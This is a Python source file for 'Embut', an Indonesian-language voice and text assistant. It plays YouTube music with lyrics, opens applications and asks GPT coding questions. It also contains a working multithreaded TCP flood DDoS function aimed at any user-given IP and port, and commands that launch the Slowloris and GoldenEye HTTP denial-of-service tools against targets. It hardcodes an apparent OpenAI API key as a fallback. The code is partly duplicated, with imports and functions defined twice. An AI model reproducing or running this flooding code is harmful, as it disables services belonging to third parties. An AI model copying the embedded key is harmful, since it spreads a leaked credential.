import os
import re
import webbrowser
import datetime
import openai
import pyttsx3
import yt_dlp
import vlc
import socket
import threading
import random
import time
import requests
import sys
import platform
import subprocess
import queue
import speech_recognition as sr
from colorama import init, Fore, Style
import pyfiglet

# === KONFIGURASI ===
openai.api_key = os.getenv("OPENAI_API_KEY", "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")

init(autoreset=True)
engine = pyttsx3.init()
engine.setProperty('rate', 160)
player = None

# === GLOBAL FLAG UNTUK DDOS ===
ddos_stop_flag = threading.Event()

def ngomong(text):
    print(f"{Fore.GREEN}🐱 Embut: {text}{Fore.RESET}")
    engine.say(text)
    engine.runAndWait()

def hear_the_sound():
    r = sr.Recognizer()
    with sr.Microphone() as source:
        print(Fore.CYAN + "🎤 Listening..." + Fore.RESET)
        audio = r.listen(source)
        try:
            order = r.recognize_google(audio, language="id-ID")
            print(f"{Fore.LIGHTYELLOW_EX}> (Suara) {order}{Fore.RESET}")
            return order.lower()
        except:
            ngomong("Maaf, tolong ulangi lebih jelas.")
            return ""

def buka_aplikasi(name):
    apps = {
        "chrome": "start chrome",
        "notepad": "start notepad",
        "youtube": "start https://www.youtube.com",
    }
    if name in apps:
        os.system(apps[name])
        ngomong(f"{name.capitalize()} terbuka")
    else:
        ngomong("Aplikasi tidak dikenali")

def bantu_ngoding(perintah):
    try:
        response = openai.ChatCompletion.create(
            model="gpt-3.5-turbo",
            messages=[
                {"role": "system", "content": "Kamu adalah asisten coding pintar."},
                {"role": "user", "content": perintah}
            ]
        )
        jawaban = response["choices"][0]["message"]["content"]
        ngomong("Ini jawabannya...")
        print(Fore.LIGHTMAGENTA_EX + jawaban + Fore.RESET)
        ngomong(jawaban[:100])
    except Exception as e:
        print(f"{Fore.RED}⚠️ Gagal ambil jawaban dari Embut: {e}{Fore.RESET}")

import os
import time
import yt_dlp
import vlc
import requests

init(autoreset=True)

# Setup pyttsx3 dan antrian TTS
tts_queue = queue.Queue()
engine = pyttsx3.init()

# Cari voice bahasa Indonesia kalau ada
voices = engine.getProperty('voices')
for voice in voices:
    if 'indonesia' in voice.name.lower() or 'id' in voice.id.lower():
        engine.setProperty('voice', voice.id)
        break
engine.setProperty('rate', 150)

def tts_worker():
    while True:
        text = tts_queue.get()
        if text is None:  # tanda stop thread
            break
        engine.say(text)
        engine.runAndWait()
        tts_queue.task_done()

# Start thread tts_worker satu kali saja
threading.Thread(target=tts_worker, daemon=True).start()

def ngomong(text):
    print(f"🐱 Embut: {text}")
    tts_queue.put(text)

def cari_lirik(judul):
    try:
        query = judul.lower().split("feat")[0].strip()
        url = f"https://some-random-api.com/lyrics?title={query}"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return data.get("lyrics", "❌ Lirik nggak ketemu.")
        else:
            return "❌ Lirik nggak ketemu atau error API."
    except Exception as e:
        return f"⚠️ Gagal ambil lirik: {str(e)}"

def parse_lrc(lrc_text):
    pattern = re.compile(r'\[(\d+):(\d+\.\d+)\](.*)')
    lrc_lines = []
    for line in lrc_text.splitlines():
        match = pattern.match(line)
        if match:
            minutes = int(match.group(1))
            seconds = float(match.group(2))
            text = match.group(3).strip()
            timestamp = minutes * 60 + seconds
            lrc_lines.append((timestamp, text))
    lrc_lines.sort(key=lambda x: x[0])
    return lrc_lines

def sync_lirik_neon(player, lrc_lines):
    i = 0
    total_lines = len(lrc_lines)
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.YELLOW, Fore.GREEN, Fore.RED]

    while i < total_lines and player.is_playing():
        time_ms = player.get_time()
        time_sec = time_ms / 1000 if time_ms != -1 else 0
        if time_sec >= lrc_lines[i][0]:
            color = colors[i % len(colors)]
            print(color + lrc_lines[i][1] + Style.RESET_ALL)
            ngomong(lrc_lines[i][1])
            i += 1
        time.sleep(0.5)

player = None

def play_lagu(judul):
    global player
    if not judul.strip():
        ngomong("🎵 Judul lagunya nggak boleh kosong.")
        return

    try:
        vlc_path = r"C:\Program Files\VideoLAN\VLC\vlc.exe"
        if os.path.exists(vlc_path):
            os.environ["PATH"] += os.pathsep + os.path.dirname(vlc_path)

        ydl_opts = {
            'format': 'bestaudio/best',
            'quiet': True,
            'default_search': 'ytsearch1',
            'nocheckcertificate': True,
        }

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(judul, download=False)
            if 'entries' in info and info['entries']:
                stream_url = info['entries'][0].get('url')
                title = info['entries'][0].get('title', judul)
            else:
                stream_url = info.get('url')
                title = info.get('title', judul)

            if not stream_url:
                ngomong("⚠️ Gagal ambil URL streaming. Video mungkin dilindungi DRM atau error.")
                return

        ngomong(f"🎶 Muterin lagu: {title}")

        instance = vlc.Instance()
        player = instance.media_player_new()
        media = instance.media_new(stream_url)
        player.set_media(media)
        player.audio_set_volume(80)
        player.play()
        time.sleep(1)

        lirik = cari_lirik(title)
        print("\n📜 Lirik:\n" + "-"*40)
        print(lirik)
        print("-"*40)

        if lirik.startswith('['):
            lrc_lines = parse_lrc(lirik)
            threading.Thread(target=sync_lirik_neon, args=(player, lrc_lines), daemon=True).start()

    except Exception as e:
        ngomong(f"⚠️ Gagal muter lagu: {str(e)}")

def stop_lagu():
    global player
    if player is not None:
        player.stop()
        ngomong("⏹️ Lagu sudah dihentikan.")
    else:
        ngomong("⚠️ Tidak ada lagu yang sedang diputar.")

# --- Contoh parsing perintah dari user ---
def proses_perintah(perintah):
    perintah = perintah.strip().lower()
    if perintah.startswith("play lagu "):
        judul = perintah[10:].strip()
        play_lagu(judul)
    elif perintah == "stop lagu":
        stop_lagu()
    else:
        ngomong("⚠️ Perintah tidak dikenali. Gunakan 'play lagu [judul]' atau 'stop lagu'.")


def log_aktivitas(command):
    waktu_sekarang = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a") as file:
        file.write(f"[{waktu_sekarang}] {command}\n")

def ddos_attack(ip, port):
    while not ddos_stop_flag.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((ip, port))
            packet = random._urandom(1024)
            s.send(packet)
            print(Fore.RED + f"[+] Packet sent to {ip}:{port}" + Fore.RESET)
            s.close()
        except Exception:
            pass

def start_ddos(ip, port, threads):
    ddos_stop_flag.clear()
    print(Fore.GREEN + f"🚀 Mulai serangan ke {ip}:{port} dengan {threads} thread..." + Fore.RESET)
    for _ in range(threads):
        t = threading.Thread(target=ddos_attack, args=(ip, port))
        t.daemon = True
        t.start()
    print(Fore.YELLOW + "Tekan CTRL+C untuk menghentikan serangan." + Fore.RESET)
    try:
        while not ddos_stop_flag.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        ddos_stop_flag.set()
        print(Fore.CYAN + "\n🛑 Serangan dihentikan oleh user." + Fore.RESET)

def cek_ping_ip(ip_address):
    print(f"\n{Fore.CYAN}=== PING KE {ip_address} ==={Fore.RESET}")
    try:
        system_os = platform.system().lower()
        if system_os == "windows":
            ping_cmd = ["ping", "-n", "4", ip_address]
        else:
            ping_cmd = ["ping", "-c", "4", ip_address]

        result = subprocess.run(ping_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode == 0:
            print(Fore.GREEN + "[✓] Ping berhasil!" + Fore.RESET)
            print(result.stdout)

            if system_os == "windows":
                match = re.search(r'Average = (\d+ms)', result.stdout)
                if match:
                    print(f"{Fore.YELLOW}[✓] Rata-rata latency: {match.group(1)}{Fore.RESET}")
            else:
                match = re.search(r'rtt min/avg/max/mdev = ([\d.]+)/([\d.]+)/([\d.]+)', result.stdout)
                if match:
                    print(f"{Fore.YELLOW}[✓] Latency - Min: {match.group(1)} ms | Avg: {match.group(2)} ms | Max: {match.group(3)} ms{Fore.RESET}")
        else:
            print(Fore.RED + "[!] Gagal ping!" + Fore.RESET)
            print(result.stderr)

    except Exception as e:
        print(f"{Fore.RED}[!] Error saat ping: {e}{Fore.RESET}")


def tampilkan_menu():
    # Neon ASCII Title
    ascii_banner = pyfiglet.figlet_format("EMBUT", font="slant")
    for line in ascii_banner.splitlines():
        for i in range(0, 10):
            sys.stdout.write(Fore.LIGHTMAGENTA_EX + " " * i + line + "\r")
            sys.stdout.flush()
            time.sleep(0.01)
        print(Fore.LIGHTCYAN_EX + " " * 10 + line)
    print(Fore.YELLOW + "=" * 70)
    # Menu items tampil normal, hanya sekali, tetap berwarna
    menu_items = [
        (Fore.MAGENTA, "🎵 MUSIK"),
        (Fore.LIGHTGREEN_EX, "  ▶ play [judul lagu]" + Fore.WHITE + "         ➜ Muterin lagu langsung dari YouTube"),
        (Fore.LIGHTGREEN_EX, "  ⏸ pause" + Fore.WHITE + "                    ➜ Jeda lagu yang sedang diputar"),
        (Fore.LIGHTGREEN_EX, "  ⏹ stop" + Fore.WHITE + "                     ➜ Hentikan lagu yang sedang diputar\n"),
        (Fore.MAGENTA, "🌐 APLIKASI"),
        (Fore.LIGHTGREEN_EX, "  🌍 buka chrome" + Fore.WHITE + "              ➜ Buka Google Chrome"),
        (Fore.LIGHTGREEN_EX, "  📄 buka notepad" + Fore.WHITE + "             ➜ Buka Notepad\n"),
        (Fore.MAGENTA, "⚔️ ATTACK & NETWORK"),
        (Fore.LIGHTGREEN_EX, "  💣 serang [ip] [port] [threads]" + Fore.WHITE + " ➜ Mulai serangan DDoS TCP Flood"),
        (Fore.LIGHTGREEN_EX, "  🛑 stopddos" + Fore.WHITE + "                 ➜ Hentikan serangan DDoS"),
        (Fore.LIGHTGREEN_EX, "  🔍 cekip [domain]" + Fore.WHITE + "           ➜ Cek IP dan port dari domain"),
        (Fore.LIGHTGREEN_EX, "  📡 cekping [ip/domain]" + Fore.WHITE + "      ➜ Cek koneksi (ping)\n"),
        (Fore.MAGENTA, "🤖 AI CODING"),
        (Fore.LIGHTGREEN_EX, "  💬 tanya [perintah]" + Fore.WHITE + "         ➜ Nanya soal coding ke GPT\n"),
        (Fore.MAGENTA, "🛠️ HACKING TOOLS"),
        (Fore.LIGHTGREEN_EX, "  🐍 slowloris " + Fore.WHITE + "        ➜ Jalankan serangan Slowloris"),
        (Fore.LIGHTGREEN_EX, "  🦾 goldeneye" + Fore.WHITE + "                ➜ Jalankan GoldenEye (HTTP DoS)\n"),
        (Fore.MAGENTA, "🗣️ INPUT MODE"),
        (Fore.LIGHTGREEN_EX, "  🎙️ suara" + Fore.WHITE + "                   ➜ Gunakan perintah suara"),
        (Fore.LIGHTGREEN_EX, "  ⌨️ ketik" + Fore.WHITE + "                   ➜ Gunakan perintah ketikan\n"),
        (Fore.MAGENTA, "🔧 LAINNYA"),
        (Fore.LIGHTGREEN_EX, "  📋 menu" + Fore.WHITE + "                    ➜ Tampilkan menu ini lagi"),
        (Fore.LIGHTGREEN_EX, "  🧹 clear" + Fore.WHITE + "                   ➜ Bersihkan layar"),
        (Fore.LIGHTGREEN_EX, "  ❌ exit" + Fore.WHITE + "                    ➜ Keluar dari Embut\n"),
    ]
    for color, item in menu_items:
        print(color + item)
    print(Fore.YELLOW + "=" * 70)

def proses_perintah(perintah):
    log_aktivitas(perintah)
    if perintah.startswith("buka "):
        app = perintah[5:]
        buka_aplikasi(app)
    elif perintah.startswith("tanya "):
        prompt = perintah[6:]
        bantu_ngoding(prompt)
    elif perintah.startswith("play "):
        judul = perintah[5:]
        play_lagu(judul)
    elif perintah == "stop":
        stop_lagu()
    elif perintah == "menu":
        tampilkan_menu()
    elif perintah == "clear":
        os.system('cls' if os.name == 'nt' else 'clear')
    elif perintah.startswith("serang "):
        parts = perintah.split()
        if len(parts) < 2:
            ngomong("Format serang: serang [ip] [port] [threads]")
            return
        ip = parts[1]
        try:
            port = int(parts[2]) if len(parts) > 2 else 80
            threads = int(parts[3]) if len(parts) > 3 else 100
            if not (1 <= port <= 65535):
                ngomong("Port harus antara 1-65535!")
                return
            if threads < 1 or threads > 1000:
                ngomong("Threads harus antara 1-1000!")
                return
        except ValueError:
            ngomong("Port dan threads harus berupa angka!")
            return
        try:
            ip = socket.gethostbyname(ip)
        except Exception as e:
            ngomong(f"Gagal resolve IP: {e}")
            return
        ngomong(f"Menyerang {ip}:{port} dengan {threads} thread. Tekan CTRL+C atau ketik 'stopddos' untuk berhenti.")
        start_ddos(ip, port, threads)
    elif perintah == "stopddos":
        ddos_stop_flag.set()
        print(Fore.CYAN + "🛑 Permintaan stop DDoS diterima." + Fore.RESET)
    elif perintah.startswith("cekip "):
        domain = perintah[6:]
        try:
            ip = socket.gethostbyname(domain)
            ngomong(f"IP dari {domain} adalah {ip}")
            print("Port umum: 80 (HTTP), 443 (HTTPS)")
        except Exception as e:
            ngomong(f"Gagal resolve IP: {e}")
    elif perintah.startswith("cekping"):
        parts = perintah.split()
        target = parts[1] if len(parts) > 1 else "8.8.8.8"
        try:
            ip = socket.gethostbyname(target)
            cek_ping_ip(ip)
        except Exception as e:
            ngomong(f"Gagal resolve IP dari {target}: {e}")
    elif perintah.startswith("slowloris "):
        target = perintah.split(" ", 1)[1]
        try:
            subprocess.run(["python", "-m", "slowloris", target])
        except Exception as e:
            ngomong(f"Gagal menjalankan slowloris: {e}")
    elif perintah.startswith("goldeneye "):
        try:
            target = perintah.split(" ", 1)[1]
            os.chdir("GoldenEye-master")
            subprocess.run(["python", "goldeneye.py", target, "-w", "100"])
            os.chdir("..")
        except Exception as e:
            ngomong(f"Gagal menjalankan GoldenEye: {e}")
    elif perintah == "exit":
        ngomong("Sampai jumpa rek!")
        exit()
    else:
        ngomong("Perintah tidak dikenali.")

def main():
    ngomong("Halo, gue Embut. Mau ketik atau ngomong?")
    tampilkan_menu()  # pastikan fungsi ini ada dan jalan, buat nunjukin menu

    while True:
        mode = input(Fore.LIGHTCYAN_EX + "Ketik [suara] atau [ketik]: ").lower().strip()

        if mode == "suara":
            ngomong("Mode suara aktif. Tekan Ctrl+C untuk berhenti.")
            while True:
                try:
                    perintah = hear_the_sound()  # fungsi yang buat denger suara
                    if perintah:
                        proses_perintah(perintah)
                except KeyboardInterrupt:
                    ngomong("Mode suara dihentikan. Mau pakai ketik?")
                    break

        elif mode == "ketik":
            ngomong("Mode ketik aktif. Tekan Ctrl+C untuk berhenti.")
            while True:
                try:
                    perintah = input(Fore.LIGHTGREEN_EX + "> ").lower().strip()
                    if perintah:
                        proses_perintah(perintah)
                except KeyboardInterrupt:
                    ngomong("Mode ketik dihentikan. Mau pakai suara?")
                    break

        elif mode == "exit":
            ngomong("Sampai jumpa rek!")
            break

        else:
            ngomong("Pilih 'suara' atau 'ketik', ya!")
            tampilkan_menu()


if __name__ == "__main__":
    main()
# Jalankan fungsi utama
